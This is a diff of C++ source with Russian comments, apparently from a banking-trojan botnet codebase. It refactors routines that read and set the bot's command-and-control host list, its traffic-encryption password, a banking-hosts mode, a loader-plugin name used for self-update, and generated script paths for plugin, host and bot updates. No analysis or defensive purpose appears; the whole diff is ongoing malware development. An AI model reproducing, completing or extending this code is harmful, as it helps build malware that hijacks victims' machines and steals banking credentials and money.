@@ -29,6 +29,16 @@ char BOT_VERSION_BUF[] = BOT_VERSION_HEADER    BOT_VERSION;
 
 
 
+//----------------------------------------------------------------------------
+// Имя бот плага.
+// Будет передаватся от LoaderDll в ботплаг.
+// Параметр необходим для выполнения команды обновления плага.
+// В самом ботплаге нет информации из какого файла его подгрузили.
+//----------------------------------------------------------------------------
+char BotPlugName[MAX_BOT_PLUG_NAME_SIZE] = BOTPARAM_PLUG_NAME;
+
+
+
 #ifndef DEBUGCONFIG
 //=============================================================================
 //  Параметры которые должны бать вшиты билдером бота
@@ -68,14 +78,6 @@ char BOT_VERSION_BUF[] = BOT_VERSION_HEADER    BOT_VERSION;
 	// Основной пароль бота. Весь трафик будет шифроваться этим паролем
 	//----------------------------------------------------------------------------
 	char MainPassword[MAX_PASSWORD_SIZE + 1] = BOTPARAM_MAINPASSWORD;
-
-	//----------------------------------------------------------------------------
-	// Имя бот плага.
-	// Будет передаватся от LoaderDll в ботплаг.
-	// Параметр необходим для выполнения команды обновления плага. 
-	// В самом ботплаге нет информации из какого файла его подгрузили.
-	//----------------------------------------------------------------------------
-	char BotPlugName[MAX_BOT_PLUG_NAME_SIZE] = BOTPARAM_PLUG_NAME;
 //=============================================================================
 #else
 
@@ -321,10 +323,13 @@ string GetPrefix(bool CheckBankingMode)
 			case SCRIPT_HUNTER:       RANGE(false, 49, 56, 48, 56);
 			case SCRIPT_PLUGINS_LIST: RANGE(false, 57, 64, 57, 64);
 			case SCRIPT_REMOTE_LOG:   return (PCHAR)PathRemoteLog;
+			case SCRIPT_PLUGIN:       Exts = (PCHAR*)&UpdateScriptsExts[0]; RANGE(false, 16, 18, 16, 18);
+
 
 			// ссылки из массива обновлений
 			case SCRIPT_UPDATE_HOSTS: Exts = (PCHAR*)&UpdateScriptsExts[0]; RANGE(false, 7, 9, 7, 9);
 			case SCRIPT_UPDATE_BOT:   Exts = (PCHAR*)&UpdateScriptsExts[0]; RANGE(false, 10, 12, 10, 12);
+
 		default:
 			return NULL;
 		}
@@ -402,15 +407,6 @@ int GetDelay()
 	return V;
 }
 
-#ifdef DEBUGCONFIG
-	// В отладочном режиме предоставляем возможность установить отладочный хост
-	void SetDebugHost(PCHAR Host)
-	{
-		
-		if (!StrCopy(BOT_MAINHOSTS_ARRAY, Host))
-        	StrCopy(BOT_MAINHOSTS_ARRAY, "localhost");
-	}
-#endif
 //-----------------------------------------------------------------------------
 
 
@@ -803,38 +799,22 @@ PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, PCHAR
 DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 {
 	//  Функция возвращает парметр бота
-	if (Buffer != NULL && BufSize == 0)
-		return 0;
+	if (!Buffer && !BufSize) return 0;
 
-	PCHAR Value = NULL;
+	PCHAR Value;
 
-	#ifdef DEBUGCONFIG
-		switch (ParamID) {
-			case BOT_PARAM_PREFIX:       Value = BOT_PREFIX;  break;
-			case BOT_PARAM_HOSTS:        Value = BOT_MAINHOSTS_ARRAY; break;
-			case BOT_PARAM_KEY:          Value = MainPassword; break;
-			case BOT_PARAM_DELAY:        Value = Delay; break;
-			#ifdef USE_BANKING_HOSTS
-				case BOT_PARAM_BANKINGHOSTS: Value = BOT_BANKHOSTS_ARRAY; break;
-			#endif
-		default: return 0;
-		}
-	#else
-		switch (ParamID) {
-			case BOT_PARAM_PREFIX:       Value = BOT_PREFIX;  break;
-			case BOT_PARAM_HOSTS:        Value = BOT_MAINHOSTS_ARRAY; break;
-			case BOT_PARAM_KEY:          Value = MainPassword; break;
-			case BOT_PARAM_DELAY:        Value = Delay; break;
-			case BOT_PARAM_BOTPLUGNAME:  Value = BotPlugName; break;
-			#ifdef USE_BANKING_HOSTS
+	switch (ParamID)
+	{
+		case BOT_PARAM_PREFIX:       Value = BOT_PREFIX;  break;
+		case BOT_PARAM_HOSTS:        Value = BOT_MAINHOSTS_ARRAY; break;
+		case BOT_PARAM_KEY:          Value = MainPassword; break;
+		case BOT_PARAM_DELAY:        Value = Delay; break;
+		case BOT_PARAM_BOTPLUGNAME:  Value = BotPlugName; break;
+		#ifdef USE_BANKING_HOSTS
 			case BOT_PARAM_BANKINGHOSTS: Value = BOT_BANKHOSTS_ARRAY; break;
-			#endif
+		#endif
 		default: return 0;
-		}
-	#endif
-
-	if (Value == NULL)
-		return 0;
+	}
 
 	// Лпределяем размер параметра
 	DWORD Size = 0;
@@ -843,16 +823,11 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 						ParamID == BOT_PARAM_BANKINGHOSTS;
 
 	if (ParamIsHosts)
-	{
 		Size = STR::CalcDoubleZeroStrLength(Value);
-	}
 	else
-		Size = StrCalcLength(Value);
+		Size = STRA::Length(Value);
 
-
-	if (Buffer == NULL)
-		return Size;
-
+	if (!Buffer) return Size;
 
 	// Копируем значение
 	m_memset(Buffer, 0, BufSize);
@@ -878,8 +853,6 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 			DecryptStr(Buffer, Buffer);
 		}
 	#endif
-
-
 	return Size;
 }
 //----------------------------------------------------------------------------
@@ -891,7 +864,7 @@ BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
 
 	DWORD Size = 0;    // Размер  устанавливаемого параметра
 	LPVOID Buf = NULL; // Приёмный буфер
-	DWORD Max = 0;     // Максимально допустимый размер
+	DWORD Max  = 0;     // Максимально допустимый размер
 
 	if (ParamID != BOT_PARAM_HOSTS)
 		Size = StrCalcLength(Param);
@@ -912,8 +885,8 @@ BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
 		case BOT_PARAM_HOSTS:
 			{
 				Size = STR::CalcDoubleZeroStrLength(Param);
-				Buf = BOT_MAINHOSTS_ARRAY;
-				Max = MAX_MAINHOSTS_BUF_SIZE;
+				Buf  = BOT_MAINHOSTS_ARRAY;
+				Max  = MAX_MAINHOSTS_BUF_SIZE;
 				break;
 			}
 
@@ -934,15 +907,12 @@ BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
 			}
 
 		// Устанавливаем имя плага
-		#ifndef DEBUGCONFIG
 		case BOT_PARAM_BOTPLUGNAME:
 			{
 				Buf = BotPlugName;
 				Max = MAX_BOT_PLUG_NAME_SIZE;
 				break;
 			}
-		#endif
-
 
 		// Устанавливаем хосты BANKING режима
 		#ifdef USE_BANKING_HOSTS
